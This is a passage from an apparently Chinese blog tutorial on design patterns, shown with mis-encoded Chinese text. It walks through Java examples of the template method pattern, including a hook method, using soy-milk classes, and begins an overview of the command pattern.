class="hljs-title function_">addCondiments</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; åŠ å…¥ä¸Šå¥½çš„èŠ±ç”Ÿ &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>RedBeanSoyaMilk.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedBeanSoyaMilk</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SoyaMilk</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCondiments</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; åŠ å…¥ä¸Šå¥½çš„çº¢è±† &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>SoyaMilk.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template;<br><br><span class="hljs-comment">//æŠ½è±¡ç±»ï¼Œè¡¨ç¤ºè±†æµ†</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SoyaMilk</span> &#123;<br><br>   <span class="hljs-comment">//æ¨¡æ¿æ–¹æ³•, make , æ¨¡æ¿æ–¹æ³•å¯ä»¥åšæˆfinal , ä¸è®©å­ç±»å»è¦†ç›–.</span><br>   <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">make</span><span class="hljs-params">()</span> &#123;<br>      <br>      select(); <br>      addCondiments();<br>      soak();<br>      beat();<br>      <br>   &#125;<br>   <br>   <span class="hljs-comment">//é€‰ææ–™</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;ç¬¬ä¸€æ­¥ï¼šé€‰æ‹©å¥½çš„æ–°é²œé»„è±†  &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">//æ·»åŠ ä¸åŒçš„é…æ–™ï¼Œ æŠ½è±¡æ–¹æ³•, å­ç±»å…·ä½“å®ç°</span><br>   <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCondiments</span><span class="hljs-params">()</span>;<br>   <br>   <span class="hljs-comment">//æµ¸æ³¡</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">soak</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;ç¬¬ä¸‰æ­¥ï¼Œ é»„è±†å’Œé…æ–™å¼€å§‹æµ¸æ³¡ï¼Œ éœ€è¦3å°æ—¶ &quot;</span>);<br>   &#125;<br>    <br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">beat</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;ç¬¬å››æ­¥ï¼šé»„è±†å’Œé…æ–™æ”¾åˆ°è±†æµ†æœºå»æ‰“ç¢  &quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">----</span><span class="hljs-comment">åˆ¶ä½œçº¢è±†è±†æµ†</span><span class="hljs-literal">----</span><br><span class="hljs-comment">ç¬¬ä¸€æ­¥ï¼šé€‰æ‹©å¥½çš„æ–°é²œé»„è±†</span>  <br> <span class="hljs-comment">åŠ å…¥ä¸Šå¥½çš„çº¢è±†</span> <br><span class="hljs-comment">ç¬¬ä¸‰æ­¥ï¼Œ é»„è±†å’Œé…æ–™å¼€å§‹æµ¸æ³¡ï¼Œ éœ€è¦3å°æ—¶</span> <br><span class="hljs-comment">ç¬¬å››æ­¥ï¼šé»„è±†å’Œé…æ–™æ”¾åˆ°è±†æµ†æœºå»æ‰“ç¢</span>  <br><span class="hljs-literal">----</span><span class="hljs-comment">åˆ¶ä½œèŠ±ç”Ÿè±†æµ†</span><span class="hljs-literal">----</span><br><span class="hljs-comment">ç¬¬ä¸€æ­¥ï¼šé€‰æ‹©å¥½çš„æ–°é²œé»„è±†</span>  <br> <span class="hljs-comment">åŠ å…¥ä¸Šå¥½çš„èŠ±ç”Ÿ</span> <br><span class="hljs-comment">ç¬¬ä¸‰æ­¥ï¼Œ é»„è±†å’Œé…æ–™å¼€å§‹æµ¸æ³¡ï¼Œ éœ€è¦3å°æ—¶</span> <br><span class="hljs-comment">ç¬¬å››æ­¥ï¼šé»„è±†å’Œé…æ–™æ”¾åˆ°è±†æµ†æœºå»æ‰“ç¢</span> <br></code></pre></td></tr></table></figure><h3 id="æ¨¡æ¿æ–¹æ³•æ¨¡å¼çš„é’©å­æ–¹æ³•"><a class="markdownIt-Anchor" href="#æ¨¡æ¿æ–¹æ³•æ¨¡å¼çš„é’©å­æ–¹æ³•"></a> æ¨¡æ¿æ–¹æ³•æ¨¡å¼çš„é’©å­æ–¹æ³•</h3><ol><li><p>åœ¨æ¨¡æ¿æ–¹æ³•æ¨¡å¼çš„<strong>çˆ¶ç±»</strong>ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥<strong>å®šä¹‰ä¸€ä¸ªæ–¹æ³•</strong>ï¼Œå®ƒ<strong>é»˜è®¤ä¸åšä»»ä½•äº‹</strong>ï¼Œå­ç±»å¯ä»¥è§†æƒ…å†µè¦ä¸è¦è¦†ç›–å®ƒï¼Œè¯¥æ–¹æ³•ç§°ä¸ºâ€œé’©å­â€ã€‚</p></li><li><p>è¿˜æ˜¯ç”¨ä¸Šé¢åšè±†æµ†çš„ä¾‹å­æ¥è®²è§£ï¼Œæ¯”å¦‚ï¼Œæˆ‘ä»¬è¿˜å¸Œæœ›<strong>åˆ¶ä½œçº¯è±†æµ†</strong>ï¼Œ<strong>ä¸æ·»åŠ ä»»ä½•çš„é…æ–™</strong>ï¼Œè¯·ä½¿ç”¨é’©å­æ–¹æ³•å¯¹å‰é¢çš„æ¨¡æ¿æ–¹æ³•è¿›è¡Œæ”¹é€ </p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230103151439028.png" alt="image-20230103151439028" /></p><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//åˆ¶ä½œçº¢è±†è±†æµ†</span><br>      <br>      System.out.println(<span class="hljs-string">&quot;----åˆ¶ä½œçº¢è±†è±†æµ†----&quot;</span>);<br>      <span class="hljs-type">SoyaMilk</span> <span class="hljs-variable">redBeanSoyaMilk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedBeanSoyaMilk</span>();<br>      redBeanSoyaMilk.make();<br>      <br>      System.out.println(<span class="hljs-string">&quot;----åˆ¶ä½œèŠ±ç”Ÿè±†æµ†----&quot;</span>);<br>      <span class="hljs-type">SoyaMilk</span> <span class="hljs-variable">peanutSoyaMilk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PeanutSoyaMilk</span>();<br>      peanutSoyaMilk.make();<br>      <br>      System.out.println(<span class="hljs-string">&quot;----åˆ¶ä½œçº¯è±†æµ†----&quot;</span>);<br>      <span class="hljs-type">SoyaMilk</span> <span class="hljs-variable">pureSoyaMilk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PureSoyaMilk</span>();<br>      pureSoyaMilk.make();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>PeanutSoyaMilk.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PeanutSoyaMilk</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SoyaMilk</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCondiments</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; åŠ å…¥ä¸Šå¥½çš„èŠ±ç”Ÿ &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>PureSoyaMilk.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PureSoyaMilk</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SoyaMilk</span>&#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCondiments</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//ç©ºå®ç°</span><br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-type">boolean</span> <span class="hljs-title function_">customerWantCondiments</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>   &#125;<br> <br>&#125;<br></code></pre></td></tr></table></figure><p><code>RedBeanSoyaMilk.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedBeanSoyaMilk</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SoyaMilk</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCondiments</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; åŠ å…¥ä¸Šå¥½çš„çº¢è±† &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>SoyaMilk.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.template.improve;<br><br><span class="hljs-comment">//æŠ½è±¡ç±»ï¼Œè¡¨ç¤ºè±†æµ†</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SoyaMilk</span> &#123;<br><br>   <span class="hljs-comment">//æ¨¡æ¿æ–¹æ³•, make , æ¨¡æ¿æ–¹æ³•å¯ä»¥åšæˆfinal , ä¸è®©å­ç±»å»è¦†ç›–.</span><br>   <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">make</span><span class="hljs-params">()</span> &#123;<br>      <br>      select(); <br>      <span class="hljs-keyword">if</span>(customerWantCondiments()) &#123;<br>         addCondiments();<br>      &#125;<br>      soak();<br>      beat();<br>      <br>   &#125;<br>   <br>   <span class="hljs-comment">//é€‰ææ–™</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;ç¬¬ä¸€æ­¥ï¼šé€‰æ‹©å¥½çš„æ–°é²œé»„è±†  &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">//æ·»åŠ ä¸åŒçš„é…æ–™ï¼Œ æŠ½è±¡æ–¹æ³•, å­ç±»å…·ä½“å®ç°</span><br>   <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addCondiments</span><span class="hljs-params">()</span>;<br>   <br>   <span class="hljs-comment">//æµ¸æ³¡</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">soak</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;ç¬¬ä¸‰æ­¥ï¼Œ é»„è±†å’Œé…æ–™å¼€å§‹æµ¸æ³¡ï¼Œ éœ€è¦3å°æ—¶ &quot;</span>);<br>   &#125;<br>    <br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">beat</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;ç¬¬å››æ­¥ï¼šé»„è±†å’Œé…æ–™æ”¾åˆ°è±†æµ†æœºå»æ‰“ç¢  &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">//é’©å­æ–¹æ³•ï¼Œå†³å®šæ˜¯å¦éœ€è¦æ·»åŠ é…æ–™</span><br>   <span class="hljs-type">boolean</span> <span class="hljs-title function_">customerWantCondiments</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">----</span><span class="hljs-comment">åˆ¶ä½œçº¢è±†è±†æµ†</span><span class="hljs-literal">----</span><br><span class="hljs-comment">ç¬¬ä¸€æ­¥ï¼šé€‰æ‹©å¥½çš„æ–°é²œé»„è±†</span>  <br> <span class="hljs-comment">åŠ å…¥ä¸Šå¥½çš„çº¢è±†</span> <br><span class="hljs-comment">ç¬¬ä¸‰æ­¥ï¼Œ é»„è±†å’Œé…æ–™å¼€å§‹æµ¸æ³¡ï¼Œ éœ€è¦3å°æ—¶</span> <br><span class="hljs-comment">ç¬¬å››æ­¥ï¼šé»„è±†å’Œé…æ–™æ”¾åˆ°è±†æµ†æœºå»æ‰“ç¢</span>  <br><span class="hljs-literal">----</span><span class="hljs-comment">åˆ¶ä½œèŠ±ç”Ÿè±†æµ†</span><span class="hljs-literal">----</span><br><span class="hljs-comment">ç¬¬ä¸€æ­¥ï¼šé€‰æ‹©å¥½çš„æ–°é²œé»„è±†</span>  <br> <span class="hljs-comment">åŠ å…¥ä¸Šå¥½çš„èŠ±ç”Ÿ</span> <br><span class="hljs-comment">ç¬¬ä¸‰æ­¥ï¼Œ é»„è±†å’Œé…æ–™å¼€å§‹æµ¸æ³¡ï¼Œ éœ€è¦3å°æ—¶</span> <br><span class="hljs-comment">ç¬¬å››æ­¥ï¼šé»„è±†å’Œé…æ–™æ”¾åˆ°è±†æµ†æœºå»æ‰“ç¢</span>  <br><span class="hljs-literal">----</span><span class="hljs-comment">åˆ¶ä½œçº¯è±†æµ†</span><span class="hljs-literal">----</span><br><span class="hljs-comment">ç¬¬ä¸€æ­¥ï¼šé€‰æ‹©å¥½çš„æ–°é²œé»„è±†</span>  <br><span class="hljs-comment">ç¬¬ä¸‰æ­¥ï¼Œ é»„è±†å’Œé…æ–™å¼€å§‹æµ¸æ³¡ï¼Œ éœ€è¦3å°æ—¶</span> <br><span class="hljs-comment">ç¬¬å››æ­¥ï¼šé»„è±†å’Œé…æ–™æ”¾åˆ°è±†æµ†æœºå»æ‰“ç¢</span> <br></code></pre></td></tr></table></figure><h2 id="æ¨¡æ¿æ–¹æ³•æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#æ¨¡æ¿æ–¹æ³•æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> æ¨¡æ¿æ–¹æ³•æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h2><ol><li><p>åŸºæœ¬æ€æƒ³æ˜¯ï¼šç®—æ³•åªå­˜åœ¨äºä¸€ä¸ªåœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯åœ¨çˆ¶ç±»ä¸­ï¼Œå®¹æ˜“ä¿®æ”¹ã€‚éœ€è¦ä¿®æ”¹ç®—æ³•æ—¶ï¼Œåªè¦ä¿®æ”¹çˆ¶ç±»çš„æ¨¡æ¿æ–¹æ³•æˆ–è€…å·²ç»å®ç°çš„æŸäº›æ­¥éª¤ï¼Œå­ç±»å°±ä¼šç»§æ‰¿è¿™äº›ä¿®æ”¹</p></li><li><p>å®ç°äº†æœ€å¤§åŒ–ä»£ç å¤ç”¨ã€‚çˆ¶ç±»çš„æ¨¡æ¿æ–¹æ³•å’Œå·²å®ç°çš„æŸäº›æ­¥éª¤ä¼šè¢«å­ç±»ç»§æ‰¿è€Œç›´æ¥ä½¿ç”¨ã€‚</p></li><li><p>æ—¢ç»Ÿä¸€äº†ç®—æ³•ï¼Œä¹Ÿæä¾›äº†å¾ˆå¤§çš„çµæ´»æ€§ã€‚çˆ¶ç±»çš„æ¨¡æ¿æ–¹æ³•ç¡®ä¿äº†ç®—æ³•çš„ç»“æ„ä¿æŒä¸å˜ï¼ŒåŒæ—¶ç”±å­ç±»æä¾›éƒ¨åˆ†æ­¥éª¤çš„å®ç°ã€‚</p></li><li><p>è¯¥æ¨¡å¼çš„ä¸è¶³ä¹‹å¤„ï¼šæ¯ä¸€ä¸ªä¸åŒçš„å®ç°éƒ½éœ€è¦ä¸€ä¸ªå­ç±»å®ç°ï¼Œå¯¼è‡´ç±»çš„ä¸ªæ•°å¢åŠ ï¼Œä½¿å¾—ç³»ç»Ÿæ›´åŠ åºå¤§</p></li><li><p>ä¸€èˆ¬æ¨¡æ¿æ–¹æ³•éƒ½åŠ ä¸Š final å…³é”®å­—ï¼Œ é˜²æ­¢å­ç±»é‡å†™æ¨¡æ¿æ–¹æ³•.</p></li><li><p>æ¨¡æ¿æ–¹æ³•æ¨¡å¼ä½¿ç”¨åœºæ™¯ï¼šå½“è¦å®Œæˆåœ¨æŸä¸ªè¿‡ç¨‹ï¼Œè¯¥è¿‡ç¨‹è¦æ‰§è¡Œä¸€ç³»åˆ—æ­¥éª¤ ï¼Œè¿™ä¸€ç³»åˆ—çš„æ­¥éª¤åŸºæœ¬ç›¸åŒï¼Œä½†å…¶ä¸ªåˆ«æ­¥éª¤åœ¨å®ç°æ—¶ å¯èƒ½ä¸åŒï¼Œé€šå¸¸è€ƒè™‘ç”¨æ¨¡æ¿æ–¹æ³•æ¨¡å¼æ¥å¤„ç†</p></li></ol><h1 id="å‘½ä»¤æ¨¡å¼"><a class="markdownIt-Anchor" href="#å‘½ä»¤æ¨¡å¼"></a> å‘½ä»¤æ¨¡å¼</h1><p>å‘½ä»¤æ¨¡å¼ï¼ˆCommandPatternï¼‰æ˜¯ä¸€ç§æ•°æ®é©±åŠ¨çš„è®¾è®¡æ¨¡å¼ï¼Œå®ƒå±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚è¯·æ±‚ä»¥å‘½ä»¤çš„å½¢å¼åŒ…è£¹åœ¨å¯¹è±¡ä¸­ï¼Œå¹¶ä¼ ç»™è°ƒç”¨å¯¹è±¡ã€‚è°ƒç”¨å¯¹è±¡å¯»æ‰¾å¯ä»¥å¤„ç†è¯¥å‘½ä»¤çš„åˆé€‚çš„å¯¹è±¡ï¼Œå¹¶æŠŠè¯¥å‘½ä»¤ä¼ ç»™ç›¸åº”çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ‰§è¡Œå‘½ä»¤ã€‚</p><h2 id="ä»‹ç»-13"><a class="markdownIt-Anchor" href="#ä»‹ç»-13"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> å°†ä¸€ä¸ªè¯·æ±‚å°è£…æˆä¸€ä¸ªå¯¹è±¡ï¼Œä»è€Œä½¿æ‚¨å¯ä»¥ç”¨ä¸åŒçš„è¯·æ±‚å¯¹å®¢æˆ·è¿›è¡Œå‚æ•°åŒ–ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong><br />åœ¨è½¯ä»¶ç³»ç»Ÿä¸­ï¼Œè¡Œä¸ºè¯·æ±‚è€…ä¸è¡Œä¸ºå®ç°è€…é€šå¸¸æ˜¯ä¸€ç§ç´§è€¦åˆçš„å…³ç³»ï¼Œä½†æŸäº›åœºåˆï¼Œæ¯”å¦‚éœ€è¦å¯¹è¡Œä¸ºè¿›è¡Œè®°å½•ã€æ’¤é”€æˆ–é‡åšã€äº‹åŠ¡ç­‰å¤„ç†æ—¶ï¼Œè¿™ç§æ— æ³•æŠµå¾¡å˜åŒ–çš„ç´§è€¦åˆçš„è®¾è®¡å°±ä¸å¤ªåˆé€‚ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong><br />åœ¨æŸäº›åœºåˆï¼Œæ¯”å¦‚è¦å¯¹è¡Œä¸ºè¿›è¡Œ&quot;è®°å½•ã€æ’¤é”€/é‡åšã€äº‹åŠ¡&quot;ç­‰å¤„ç†ï¼Œè¿™ç§æ— æ³•æŠµå¾¡å˜åŒ–çš„ç´§è€¦åˆæ˜¯ä¸åˆé€‚çš„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚ä½•å°†&quot;è¡Œä¸ºè¯·æ±‚è€…&quot;ä¸&quot;è¡Œä¸ºå®ç°è€…&quot;è§£è€¦ï¼Ÿå°†ä¸€ç»„è¡Œä¸ºæŠ½è±¡ä¸ºå¯¹è±¡ï¼Œå¯ä»¥å®ç°äºŒè€…ä¹‹é—´çš„æ¾è€¦åˆã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> é€šè¿‡è°ƒç”¨è€…è°ƒç”¨æ¥å—è€…æ‰§è¡Œå‘½ä»¤ï¼Œé¡ºåºï¼šè°ƒç”¨è€…â†’å‘½ä»¤â†’æ¥å—è€…ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> å®šä¹‰ä¸‰ä¸ªè§’è‰²ï¼š1ã€received çœŸæ­£çš„å‘½ä»¤æ‰§è¡Œå¯¹è±¡ 2ã€Command 3ã€invoker ä½¿ç”¨å‘½ä»¤å¯¹è±¡çš„å…¥å£</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> struts 1 ä¸­çš„ action æ ¸å¿ƒæ§åˆ¶å™¨ ActionServlet åªæœ‰ä¸€ä¸ªï¼Œç›¸å½“äº<br />Invokerï¼Œè€Œæ¨¡å‹å±‚çš„ç±»ä¼šéšç€ä¸åŒçš„åº”ç”¨æœ‰ä¸åŒçš„æ¨¡å‹ç±»ï¼Œç›¸å½“äºå…·ä½“çš„ Commandã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€é™ä½äº†ç³»ç»Ÿè€¦åˆåº¦ã€‚ 2ã€æ–°çš„å‘½ä»¤å¯ä»¥å¾ˆå®¹æ˜“æ·»åŠ åˆ°ç³»ç»Ÿä¸­å»ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> ä½¿ç”¨å‘½ä»¤æ¨¡å¼å¯èƒ½ä¼šå¯¼è‡´æŸäº›ç³»ç»Ÿæœ‰è¿‡å¤šçš„å…·ä½“å‘½ä»¤ç±»ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> è®¤ä¸ºæ˜¯å‘½ä»¤çš„åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨å‘½ä»¤æ¨¡å¼ï¼Œæ¯”å¦‚ï¼š 1ã€GUI ä¸­æ¯ä¸€ä¸ªæŒ‰é’®éƒ½æ˜¯ä¸€æ¡å‘½ä»¤ã€‚ 2ã€æ¨¡æ‹Ÿ CMDã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> ç³»ç»Ÿéœ€è¦æ”¯æŒå‘½ä»¤çš„æ’¤é”€(Undo)æ“ä½œå’Œæ¢å¤(Redo)æ“ä½œï¼Œä¹Ÿå¯ä»¥è€ƒè™‘ä½¿ç”¨å‘½ä»¤æ¨¡å¼ï¼Œè§å‘½ä»¤æ¨¡å¼çš„æ‰©å±•ã€‚</p><p>å‘½ä»¤æ¨¡å¼ç»“æ„ç¤ºæ„å›¾:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/commanduml.jpg" alt="" /></p><p>å¯¹åŸç†ç±»å›¾çš„è¯´æ˜-å³(å‘½åæ¨¡å¼çš„è§’è‰²åŠèŒè´£)</p><ol><li><p>Invoker æ˜¯è°ƒç”¨è€…è§’è‰²</p></li><li><p>Command: æ˜¯å‘½ä»¤è§’è‰²ï¼Œéœ€è¦æ‰§è¡Œçš„æ‰€æœ‰å‘½ä»¤éƒ½åœ¨è¿™é‡Œï¼Œå¯ä»¥æ˜¯æ¥å£æˆ–æŠ½è±¡ç±»</p></li><li><p>Receiver: æ¥å—è€…è§’è‰²ï¼ŒçŸ¥é“å¦‚ä½•å®æ–½å’Œæ‰§è¡Œä¸€ä¸ªè¯·æ±‚ç›¸å…³çš„æ“ä½œ</p></li><li><p>ConcreteCommand: 